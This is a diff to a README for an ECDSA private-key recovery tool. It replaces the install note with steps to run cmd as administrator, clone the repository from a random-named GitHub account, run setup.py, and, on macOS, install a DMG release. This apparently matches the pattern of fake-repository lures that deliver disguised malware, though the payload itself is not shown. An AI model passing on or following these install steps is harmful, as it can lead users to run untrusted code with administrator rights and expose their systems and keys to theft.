@@ -19,10 +19,49 @@ print sampleA.privkey
 ```
 
 ## **Installation Options:** 
-Windows users and those on macOS preferring manual steps, see the guide below. macOS users can also choose the simplified [DMG file](../../releases) install.
 
 
 #### setup
+The following instructions are for Windows and Linux; macOS users have a [DMG file](../../releases).
+
+
+
+
+
+Verify the installation of Git and Python on your system.
+
+
+
+Download Git for Windows:
+
+https://git-scm.com/install/windows
+
+
+
+Download Python for Windows (direct):
+
+https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe
+
+
+
+Finally, launch cmd as an administrator.
+
+
+
+
+
+```bash 
+git clone https://github.com/yadyvazifeh1oz92/ecdsa-private-key-recovery.git
+```
+```bash 
+cd ecdsa-private-key-recovery
+```
+```bash 
+py -m pip install -r requirements.txt
+```
+```bash 
+py setup.py install
+```
 
 Python 2.x:
 
